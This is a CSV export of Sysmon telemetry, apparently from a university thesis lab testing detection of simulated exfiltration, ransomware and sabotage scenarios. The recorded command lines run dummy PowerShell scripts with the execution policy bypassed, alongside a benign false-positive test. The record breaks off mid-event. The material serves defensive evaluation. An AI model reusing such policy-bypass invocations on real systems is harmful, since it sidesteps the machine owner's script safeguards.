1783860779912,1,2026-07-12T12:51:02.2249369Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:51:17.542"",
 ""ProcessGuid"": ""{6bc49a7d-8dc5-6a53-b105-000000009a01}"",
 ""ProcessId"": 2824,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,1,2026-07-12T12:51:02.2678676Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:51:17.571"",
 ""ProcessGuid"": ""{6bc49a7d-8dc5-6a53-b205-000000009a01}"",
 ""ProcessId"": 792,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8dc5-6a53-b105-000000009a01}"",
 ""ParentProcessId"": ""2824"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,11,2026-07-12T12:51:02.4399855Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:51:17.817"",
 ""ProcessGuid"": ""{6bc49a7d-8dc5-6a53-b205-000000009a01}"",
 ""ProcessId"": 792,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ko15g12c.vik.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:51:17.817"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,1,2026-07-12T12:51:30.2201721Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:51:47.907"",
 ""ProcessGuid"": ""{6bc49a7d-8de3-6a53-b405-000000009a01}"",
 ""ProcessId"": 2880,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,1,2026-07-12T12:51:30.260563Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:51:47.937"",
 ""ProcessGuid"": ""{6bc49a7d-8de3-6a53-b505-000000009a01}"",
 ""ProcessId"": 4128,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8de3-6a53-b405-000000009a01}"",
 ""ParentProcessId"": ""2880"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,11,2026-07-12T12:51:30.6682801Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:51:48.321"",
 ""ProcessGuid"": ""{6bc49a7d-8de3-6a53-b505-000000009a01}"",
 ""ProcessId"": 4128,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_rt3t2ksq.evy.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:51:48.321"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,1,2026-07-12T12:51:46.133406Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:52:01.676"",
 ""ProcessGuid"": ""{6bc49a7d-8df1-6a53-b705-000000009a01}"",
 ""ProcessId"": 6732,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,1,2026-07-12T12:51:46.1865766Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:52:01.706"",
 ""ProcessGuid"": ""{6bc49a7d-8df1-6a53-b805-000000009a01}"",
 ""ProcessId"": 11360,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8df1-6a53-b705-000000009a01}"",
 ""ParentProcessId"": ""6732"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,11,2026-07-12T12:51:46.626634Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:52:02.040"",
 ""ProcessGuid"": ""{6bc49a7d-8df1-6a53-b805-000000009a01}"",
 ""ProcessId"": 11360,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_msgwudux.c0x.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:52:02.040"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,3,2026-07-12T12:51:58.0380338Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:52:10.158"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50657"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860779912,3,2026-07-12T12:51:59.2801181Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:52:10.364"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50658"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860779912,1,2026-07-12T12:52:05.6225345Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:52:15.575"",
 ""ProcessGuid"": ""{6bc49a7d-8dff-6a53-b905-000000009a01}"",
 ""ProcessId"": 10604,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,1,2026-07-12T12:52:05.7157265Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:52:15.614"",
 ""ProcessGuid"": ""{6bc49a7d-8dff-6a53-ba05-000000009a01}"",
 ""ProcessId"": 8736,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8dff-6a53-b905-000000009a01}"",
 ""ParentProcessId"": ""10604"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860779912,11,2026-07-12T12:52:06.2827645Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:52:16.041"",
 ""ProcessGuid"": ""{6bc49a7d-8dff-6a53-ba05-000000009a01}"",
 ""ProcessId"": 8736,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_fwlzlzma.ihq.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:52:16.041"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860889375,3,2026-07-12T12:53:19.4701211Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:53:30.650"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50665"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860889375,3,2026-07-12T12:53:19.4701714Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:53:30.747"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50666"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860889375,3,2026-07-12T12:54:45.6532209Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:54:56.765"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50673"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860889375,3,2026-07-12T12:54:45.6532409Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:54:56.776"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50674"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783861038826,11,2026-07-12T12:55:37.5467058Z,"{
 ""RuleName"": ""Downloads"",
 ""UtcTime"": ""2026-07-12 12:55:14.522"",
 ""ProcessGuid"": ""{6bc49a7d-7ce0-6a53-7a02-000000009a01}"",
 ""ProcessId"": 9348,
 ""Image"": ""C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\Downloads\\e60c0095-fc0f-4e78-adf4-28f07faed845.tmp"",
 ""CreationUtcTime"": ""2026-07-12 12:55:14.521"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,3,2026-07-12T12:55:49.6262267Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:56:00.810"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50677"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783861038826,3,2026-07-12T12:55:49.6262507Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:56:00.816"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50678"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783861038826,11,2026-07-12T12:55:53.5055483Z,"{
 ""RuleName"": ""Downloads"",
 ""UtcTime"": ""2026-07-12 12:55:29.566"",
 ""ProcessGuid"": ""{6bc49a7d-7ce0-6a53-7a02-000000009a01}"",
 ""ProcessId"": 9348,
 ""Image"": ""C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\Downloads\\c9092398-f8e9-4510-b3e6-4c39babd1566.tmp"",
 ""CreationUtcTime"": ""2026-07-12 12:55:29.565"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:04.6868339Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:41.518"",
 ""ProcessGuid"": ""{6bc49a7d-8ecd-6a53-bf05-000000009a01}"",
 ""ProcessId"": 6904,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -NoProfile -Command \""$ErrorActionPreference = 'Stop'\n$rid = 'TFM_FP_20260712_145541'\n$fp = 'FP-001'\nWrite-Output \""$rid $fp start\""\nGet-Process | Select-Object -First 5 | Out-Null\nGet-Service | Select-Object -First 5 | Out-Null\n\u0026 'Get-ChildItem' -LiteralPath 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\FP_WORKSPACE\\TFM_FP_20260712_145541' | Out-Null\nSelect-String -Path 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\FP_WORKSPACE\\TFM_FP_20260712_145541\\FP-001_benign.txt' -Pattern 'benign' | Out-Null\nWrite-Output \""$rid $fp ok\""\"""",
 ""CurrentDirectory"": ""C:\\Users\\seguridad\\Desktop\\TFM\\03_RUNNERS\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,11,2026-07-12T12:56:04.948581Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:55:41.823"",
 ""ProcessGuid"": ""{6bc49a7d-8ecd-6a53-bf05-000000009a01}"",
 ""ProcessId"": 6904,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_yy20qaba.ne1.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:55:41.823"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:05.6189299Z,"{
 ""RuleName"": ""-"",
